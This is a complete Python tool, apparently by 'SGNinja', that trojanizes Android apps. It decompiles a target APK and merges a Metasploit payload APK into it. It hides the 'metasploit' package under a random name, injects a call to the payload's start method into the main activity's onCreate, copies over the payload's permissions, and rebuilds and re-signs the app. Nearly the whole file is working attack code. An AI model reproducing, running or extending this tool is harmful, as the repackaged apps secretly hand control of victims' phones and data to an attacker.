#!/usr/bin/env python3
import os
import re
import shutil
import subprocess
import argparse
import string
import random
import xml.etree.ElementTree as ET
from pathlib import Path

class AndroidInjector:
    def __init__(self, target_apk, payload_apk, keystore='', keystore_pass='', key_alias='', output_dir=None):
        self.target_apk = Path(target_apk)  # Chuyển sang Path để dễ xử lý
        self.payload_apk = payload_apk
        self.keystore = keystore
        self.keystore_pass = keystore_pass
        self.key_alias = key_alias
        self.output_dir = output_dir
        self.work_dir = Path.home() / '.android_injector'
        # Clean work_dir để tránh conflict từ lần chạy trước
        if self.work_dir.exists():
            shutil.rmtree(self.work_dir)
        self.work_dir.mkdir(exist_ok=True)
        # Đường dẫn output: Nếu chỉ định output_dir thì dùng, không thì cùng thư mục target
        if self.output_dir:
            self.output_dir = Path(self.output_dir)
            self.output_dir.mkdir(parents=True, exist_ok=True)  # Tạo thư mục nếu chưa tồn tại
            self.output_apk = self.output_dir / f"{self.target_apk.stem}_injected.apk"
        else:
            self.output_apk = self.target_apk.parent / f"{self.target_apk.stem}_injected.apk"

    def execute(self):
        self.original_dir = Path.cwd()
        self.decompile_apks()
        self.main_activity = self.find_main_activity()
        print(f'[+] Main Activity identified: {self.main_activity}')
        self.merge_payload_files()
        self.inject_payload(self.main_activity)
        self.update_manifest()
        self.recompile_apk(self.work_dir / 'target_apk')
        self.sign_apk()
        # Copy output ra ngoài work_dir
        injected_path = self.work_dir / 'injected.apk'
        if injected_path.exists():
            shutil.copy(injected_path, self.output_apk)
            print(f'[+] Injected APK saved to: {self.output_apk.absolute()}')
        else:
            print(f'[-] Warning: injected.apk not found in work_dir!')

    def generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def merge_payload_files(self):
        print('[+] Merging payload files...')
        payload_apk_dir = self.work_dir / 'payload_apk'
        target_apk_dir = self.work_dir / 'target_apk'
        # Đảm bảo đang ở đúng dir gốc trước khi chdir
        os.chdir(self.original_dir)
        os.chdir(payload_apk_dir)
        self.execute_command(f'tar -cf - smali | (cd {target_apk_dir}; tar -xpf -)')
        payload_dir = target_apk_dir / 'smali' / 'com'
        self.payload_package = self.generate_random_string()
        (payload_dir / 'metasploit').rename(payload_dir / self.payload_package)
        os.chdir(target_apk_dir / 'smali' / 'com' / self.payload_package / 'stage')
        self.execute_command(f"sed -i 's/metasploit/{self.payload_package}/g' *")

    def update_manifest(self):
        print('[+] Updating AndroidManifest.xml')
        target_tree = ET.parse(self.target_manifest)
        target_root = target_tree.getroot()
        payload_tree = ET.parse(self.payload_manifest)
        payload_root = payload_tree.getroot()
        ns = {'android': 'http://schemas.android.com/apk/res/android'}
        # Lấy permissions và features từ payload
        permissions = set(
            elem.attrib['{http://schemas.android.com/apk/res/android}name']
            for elem in payload_root.findall('.//uses-permission')
        )
        features = set(
            elem.attrib['{http://schemas.android.com/apk/res/android}name']
            for elem in payload_root.findall('.//uses-feature')
        )
        # Thêm vào root của target manifest (top-level, không phải application)
        for perm in permissions:
            if not any(p.attrib.get('{http://schemas.android.com/apk/res/android}name') == perm for p in target_root.findall('.//uses-permission')):
                new_perm = ET.SubElement(target_root, 'uses-permission')
                new_perm.set('{http://schemas.android.com/apk/res/android}name', perm)
        for feat in features:
            if not any(f.attrib.get('{http://schemas.android.com/apk/res/android}name') == feat for f in target_root.findall('.//uses-feature')):
                new_feat = ET.SubElement(target_root, 'uses-feature')
                new_feat.set('{http://schemas.android.com/apk/res/android}name', feat)
        # Viết lại file với encoding đúng và indent (để tránh XML malformed)
        target_tree.write(self.target_manifest, encoding='utf-8', xml_declaration=True)

    def inject_payload(self, main_activity):
        payload_path = f'com/{self.payload_package}/stage/Payload'
        injection_code = f' invoke-static {{p0}}, L{payload_path};->start(Landroid/content/Context;)V\n'
        activity_rel = Path(main_activity.replace('.', '/'))
        activity_path = self.work_dir / 'target_apk' / 'smali' / activity_rel.with_suffix('.smali')
        temp_file = self.work_dir / 'temp.smali'
        with open(activity_path, 'r') as original, open(temp_file, 'w') as modified:
            for line in original:
                modified.write(line)
                if re.match(r'^\.method.+onCreate\(Landroid', line):
                    modified.write(injection_code)
        temp_file.replace(activity_path)

    def decompile_apks(self):
        target_dir = self.work_dir / 'target_apk'
        payload_dir = self.work_dir / 'payload_apk'
        print(f'[+] Decompiling target APK: {self.target_apk}')
        self.execute_command(f'apktool d -f {self.target_apk} -o {target_dir}')
        print(f'[+] Decompiling payload APK: {self.payload_apk}')
        self.execute_command(f'apktool d -f {self.payload_apk} -o {payload_dir}')
        self.target_manifest = target_dir / 'AndroidManifest.xml'
        self.payload_manifest = payload_dir / 'AndroidManifest.xml'

    def recompile_apk(self, apk_dir):
        print(f'[+] Recompiling APK: {apk_dir}')
        self.execute_command(f'apktool b {apk_dir}')
        # Sửa: Copy từ dist/*.apk (thường là original.apk sau b), không dùng self.target_apk full path
        dist_apk = apk_dir / 'dist' / self.target_apk.name
        if dist_apk.exists():
            shutil.copy(dist_apk, self.work_dir / 'injected.apk')
        else:
            # Fallback nếu tên khác
            dist_files = list((apk_dir / 'dist').glob('*.apk'))
            if dist_files:
                shutil.copy(dist_files[0], self.work_dir / 'injected.apk')
            else:
                raise Exception("No APK found in dist/ after recompile")

    def sign_apk(self):
        os.chdir(self.original_dir)
        apk_path = self.work_dir / 'injected.apk'
        if not Path(self.keystore).exists():
            print('[+] Creating new self-signed keystore')
            self.keystore_pass = self.generate_random_string()
            self.keystore = self.work_dir / 'temp.keystore'
            self.key_alias = 'temp_alias'
            keytool_cmd = (
                f'keytool -genkey -v -keystore {self.keystore} '
                f'-alias {self.key_alias} -keyalg RSA -keysize 2048 '
                f'-validity 10000 -storepass {self.keystore_pass} -keypass {self.keystore_pass} -dname "CN=TempCert"'
            )
            self.execute_command(keytool_cmd)
        else:
            print('[+] Using existing keystore')
        print(f'[+] Signing APK: {apk_path}')
        sign_cmd = (
            f'jarsigner -verbose -keystore {self.keystore} '
            f'-storepass {self.keystore_pass} '
            f'-digestalg SHA-256 -sigalg SHA256withRSA '
            f'{apk_path} {self.key_alias}'
        )
        self.execute_command(sign_cmd)

    def execute_command(self, cmd):
        # Thêm debug: In lệnh nếu fail
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[DEBUG] Failed command: {cmd}")
            print(f"[DEBUG] Stderr: {result.stderr}")
            raise Exception(f"Command failed: {result.stderr}")
        return result.stdout

    def find_main_activity(self):
        root = ET.parse(self.target_manifest).getroot()
        ns = {'android': 'http://schemas.android.com/apk/res/android'}
        for activity in root.findall('.//activity'):
            for intent_filter in activity.findall('intent-filter'):
                if intent_filter.find("action[@android:name='android.intent.action.MAIN']", namespaces=ns) is not None:
                    return activity.attrib['{http://schemas.android.com/apk/res/android}name']
        raise Exception("Main activity not found in AndroidManifest.xml")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Android APK Payload Injector')
    parser.add_argument('target_apk', help='Target Android APK to inject payload into')
    parser.add_argument('payload_apk', help='Payload APK file')
    parser.add_argument('-ks', '--keystore', default='debug.keystore', help='Android keystore file')
    parser.add_argument('-kp', '--keystore_pass', default='android', help='Android keystore password')
    parser.add_argument('-ka', '--key_alias', default='androiddebugkey', help='Android keystore key alias')
    parser.add_argument('-o', '--output_dir', default=None, help='Output directory for injected APK (default: same as target directory)')

    print("""
[*]=====================================
[*] Android Payload Injector Version 2.0
[*] Author: SGNinja
[*] Copyright (c) 2024
[*]=====================================
    """)

    args = parser.parse_args()
    injector = AndroidInjector(
        args.target_apk, args.payload_apk,
        keystore=args.keystore,
        keystore_pass=args.keystore_pass,
        key_alias=args.key_alias,
        output_dir=args.output_dir
    )
    injector.execute()
